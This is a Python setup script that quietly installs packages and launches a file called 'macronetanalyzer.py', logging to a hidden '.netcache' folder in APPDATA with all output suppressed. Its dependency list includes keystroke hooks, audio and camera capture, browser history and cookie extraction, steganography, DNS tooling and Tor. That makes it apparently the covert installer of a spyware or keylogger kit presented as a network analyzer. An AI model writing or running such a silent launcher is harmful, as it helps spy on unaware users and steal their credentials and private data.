import os
import sys
import subprocess
import platform
import logging

# Silent logging
logging.basicConfig(filename=os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), '.netcache', 'netsetup.log'), level=logging.INFO, format='%(asctime)s - %(message)s')

def random_string(length=8):
    import string
    import random
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def install_dependencies():
    required_packages = [
        'keyboard', 'pynput', 'requests', 'pillow', 'psutil', 'sounddevice', 'wavio', 'opencv-python',
        'browser-history', 'stegano', 'dnspython'
    ]
    optional_packages = ['scapy', 'browser_cookie3', 'torpy']
    if platform.system() == "Windows":
        required_packages.append('pywin32')
    
    python_exec = 'python3' if platform.system() != "Windows" else 'python'
    
    for pkg in required_packages + optional_packages:
        try:
            __import__(pkg)
        except ImportError:
            logging.warning(f"{pkg} not found; installing...")
            try:
                subprocess.check_call([python_exec, '-m', 'pip', 'install', pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                logging.info(f"Installed {pkg}")
            except Exception as e:
                logging.error(f"Failed to install {pkg}: {e}")

def run_macronetanalyzer():
    python_exec = 'python3' if platform.system() != "Windows" else 'python'
    try:
        subprocess.run([python_exec, 'macronetanalyzer.py'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        logging.error(f"Failed to run macronetanalyzer: {e}")
        sys.exit(1)

if __name__ == "__main__":
    logging.info("Starting setup process...")
    install_dependencies()
    logging.info("Dependencies installed; running macronetanalyzer...")
    run_macronetanalyzer()